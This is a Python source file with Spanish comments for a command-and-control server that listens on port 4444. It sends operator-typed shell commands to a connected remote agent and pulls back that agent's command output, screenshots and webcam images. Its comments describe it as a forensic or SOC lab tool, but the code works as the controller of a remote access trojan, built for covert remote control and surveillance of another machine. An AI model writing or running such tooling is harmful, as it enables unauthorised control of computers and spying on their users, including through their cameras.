import socket
import os

def recibir_fichero(endpoint, nombre_guardar):
    """
    Gestión de recepción de telemetría y evidencias forenses enviadas por el agente.
    """
    try:
        # 1. Recibimos el tamaño del archivo para preparar el buffer
        tamano_raw = endpoint.recv(1024).decode('latin-1').strip()
        if "ERROR" in tamano_raw:
            print("[-] El agente remoto no pudo generar la evidencia.")
            return
            
        tamano_esperado = int(tamano_raw)
        datos_recibidos = b""
        
        # 2. Bucle de recepción (Data Exfiltration Simulation)
        while len(datos_recibidos) < tamano_esperado:
            chunk = endpoint.recv(4096)
            if not chunk: break
            datos_recibidos += chunk
        
        # 3. Almacenamiento local de la evidencia
        with open(nombre_guardar, "wb") as f:
            f.write(datos_recibidos)
            
        ruta_absoluta = os.path.abspath(nombre_guardar)
        print(f"\n[+] RECEPCIÓN COMPLETADA")
        print(f"[+] Evidencia guardada en: {ruta_absoluta}\n")
        
    except Exception as e:
        print(f"[-] Fallo en la recepción de datos: {e}")

def iniciar_servidor():
    """
    Consola de Mando y Control diseñada para el análisis de tráfico de red y SOC Lab.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Configuración de escucha local para pruebas de laboratorio
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    print("[+] Servidor de Análisis C2 Online. Esperando conexión del endpoint...")
    
    endpoint_monitoreado, direccion = server.accept()
    print(f"[+] Endpoint conectado para estudio: {direccion}")

    while True:
        # Interfaz orientada a analista de seguridad
        comando = input("Analyst_Console> ").strip()
        if not comando: continue
        
        endpoint_monitoreado.send(comando.encode())
        
        if comando.lower() == 'exit':
            break
        elif comando.lower() == 'screenshot':
            recibir_fichero(endpoint_monitoreado, "evidencia_pantalla.png")
        elif comando.lower() == 'cam':
            recibir_fichero(endpoint_monitoreado, "evidencia_webcam.jpg")
        else:
            # Captura de salida para comandos de auditoría (whoami, hostname, etc.)
            try:
                resultado = endpoint_monitoreado.recv(20480).decode('latin-1')
                print(f"\nSalida del sistema:\n{resultado}")
            except:
                print("[-] Conexión perdida con el agente.")
                break

    server.close()

if __name__ == "__main__":
    iniciar_servidor()